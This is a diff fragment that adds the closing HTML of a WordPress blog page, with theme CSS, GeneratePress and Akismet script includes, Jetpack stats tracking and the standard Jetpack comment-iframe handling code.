+				background: #1E72BD !important;
+				color: #FFFFFF !important;
+				font-size: 25px !important;
+			}
+
+			.icon-set-lsi_widget-3 a:hover {
+				background: #777777 !important;
+				color: #FFFFFF !important;
+			}
+</style>
+<script src="https://blogs.serioustek.net/wp-content/plugins/gp-premium/addons/generate-page-header/inc/js/parallax.js?ver=3.3.1" id="generate-page-header-parallax-js"></script>
+<script src="https://blogs.serioustek.net/wp-content/plugins/gp-premium/addons/generate-secondary-nav/inc/js/navigation.js?ver=0.2" id="generate-secondary-nav-js"></script>
+<!--[if lte IE 11]>
+<script src="https://blogs.serioustek.net/wp-content/themes/generatepress/assets/js/classList.min.js?ver=3.3.1" id="generate-classlist-js"></script>
+<![endif]-->
+<script id="generate-menu-js-extra">
+var generatepressMenu = {"toggleOpenedSubMenus":"1","openSubMenuLabel":"Open Sub-Menu","closeSubMenuLabel":"Close Sub-Menu"};
+</script>
+<script src="https://blogs.serioustek.net/wp-content/themes/generatepress/assets/js/menu.min.js?ver=3.3.1" id="generate-menu-js"></script>
+<script src="https://blogs.serioustek.net/wp-includes/js/comment-reply.min.js?ver=6.7.2" id="comment-reply-js" async data-wp-strategy="async"></script>
+<script id="jetpack-stats-js-before">
+_stq = window._stq || [];
+_stq.push([ "view", JSON.parse("{\"v\":\"ext\",\"blog\":\"94542450\",\"post\":\"990\",\"tz\":\"0\",\"srv\":\"blogs.serioustek.net\",\"j\":\"1:14.5\"}") ]);
+_stq.push([ "clickTrackerInit", "94542450", "990" ]);
+</script>
+<script src="https://stats.wp.com/e-202520.js" id="jetpack-stats-js" defer data-wp-strategy="defer"></script>
+<script defer src="https://blogs.serioustek.net/wp-content/plugins/akismet/_inc/akismet-frontend.js?ver=1742477048" id="akismet-frontend-js"></script>
+		<script type="text/javascript">
+			(function () {
+				const iframe = document.getElementById( 'jetpack_remote_comment' );
+								const watchReply = function() {
+					// Check addComment._Jetpack_moveForm to make sure we don't monkey-patch twice.
+					if ( 'undefined' !== typeof addComment && ! addComment._Jetpack_moveForm ) {
+						// Cache the Core function.
+						addComment._Jetpack_moveForm = addComment.moveForm;
+						const commentParent = document.getElementById( 'comment_parent' );
+						const cancel = document.getElementById( 'cancel-comment-reply-link' );
+
+						function tellFrameNewParent ( commentParentValue ) {
+							const url = new URL( iframe.src );
+							if ( commentParentValue ) {
+								url.searchParams.set( 'replytocom', commentParentValue )
+							} else {
+								url.searchParams.delete( 'replytocom' );
+							}
+							if( iframe.src !== url.href ) {
+								iframe.src = url.href;
+							}
+						};
+
+						cancel.addEventListener( 'click', function () {
+							tellFrameNewParent( false );
+						} );
+
+						addComment.moveForm = function ( _, parentId ) {
+							tellFrameNewParent( parentId );
+							return addComment._Jetpack_moveForm.apply( null, arguments );
+						};
+					}
+				}
+				document.addEventListener( 'DOMContentLoaded', watchReply );
+				// In WP 6.4+, the script is loaded asynchronously, so we need to wait for it to load before we monkey-patch the functions it introduces.
+				document.querySelector('#comment-reply-js')?.addEventListener( 'load', watchReply );
+
+								
+				const commentIframes = document.getElementsByClassName('jetpack_remote_comment');
+
+				window.addEventListener('message', function(event) {
+					if (event.origin !== 'https://jetpack.wordpress.com') {
+						return;
+					}
+
+					if (!event?.data?.iframeUniqueId && !event?.data?.height) {
+						return;
+					}
+
+					const eventDataUniqueId = event.data.iframeUniqueId;
+
+					// Change height for the matching comment iframe
+					for (let i = 0; i < commentIframes.length; i++) {
+						const iframe = commentIframes[i];
+						const url = new URL(iframe.src);
+						const iframeUniqueIdParam = url.searchParams.get('iframe_unique_id');
+						if (iframeUniqueIdParam == event.data.iframeUniqueId) {
+							iframe.style.height = event.data.height + 'px';
+							return;
+						}
+					}
+				});
+			})();
+		</script>
+		
+</body>
+</html>
